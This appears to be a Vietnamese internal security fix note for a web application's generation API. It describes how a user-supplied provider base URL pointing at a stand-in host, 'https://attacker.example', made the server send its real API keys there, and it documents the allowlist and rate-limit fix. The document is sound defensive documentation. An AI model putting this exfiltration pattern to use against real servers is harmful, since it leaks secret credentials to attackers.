# 16 - Chốt base URL provider theo allowlist (10/2026)

Ngày: 2026-10-28. Vá lỗ rò khóa API phát hiện khi rà soát bảo mật.

## Lỗ hổng

`/api/generate` và `/api/provider-test` nhận `seedanceBaseUrl` / `seedreamBaseUrl` từ body request (ưu tiên hơn `settings` của admin), rồi gọi `${baseUrl}/...` **kèm** khóa server trong header `Authorization: Bearer`. `ssrfSafeFetch` chỉ chặn IP nội bộ, không giới hạn host ngoài. Hệ quả: một user đã được duyệt (không cần admin) đặt `seedanceBaseUrl=https://attacker.example` → server gửi `SEEDANCE_API_KEY` / `SEEDREAM_API_KEY` thật tới host của kẻ tấn công. Điều kiện khai thác: khóa provider tương ứng có trong env.

## Vá

`validateProviderBaseUrl(baseUrl, provider)` trong `server/lib/validateBaseUrl.ts`: ngoài kiểm https + chặn IP nội bộ (như `validateHttpsBaseUrl`), thêm allowlist host theo provider.

| Provider | Host mặc định cho phép |
|---|---|
| seedance | `api.seedance.com` (khớp chính xác) |
| seedream | `.bytepluses.com` (khớp hậu tố, gồm các region `ark.*.bytepluses.com`) |

- Mục bắt đầu bằng `.` là khớp hậu tố domain; so khớp chống `api.seedance.com.evil.net`.
- Admin tự host proxy riêng: thêm host qua env `SEEDANCE_ALLOWED_HOSTS` / `SEEDREAM_ALLOWED_HOSTS` (danh sách phân cách phẩy), tương tự `SSRF_ALLOWED_HOSTS`.
- Áp dụng ở cả `generate.ts` và `providerTest.ts`.

## Kèm theo

- `/api/provider-test` nay cũng qua `tryConsumeRateLimit` (10 req/phút/user) — trước đây không giới hạn, dù nó gọi ra ngoài và là đường rò ở trên.

## Còn lại (không nằm trong vá này)

- `resolveProviderFromSettings` vẫn trả `requested` bất kể `enabledProviders` của admin. Allowlist host đã đóng đường rò khóa, nhưng việc thực thi `enabledProviders` là phòng thủ nhiều lớp, để lần sau.
- Khóa Gemini nằm ở query string khi test (`?key=...`) — rủi ro thấp (HTTPS tới Google), cân nhắc chuyển sang header nếu Google hỗ trợ.
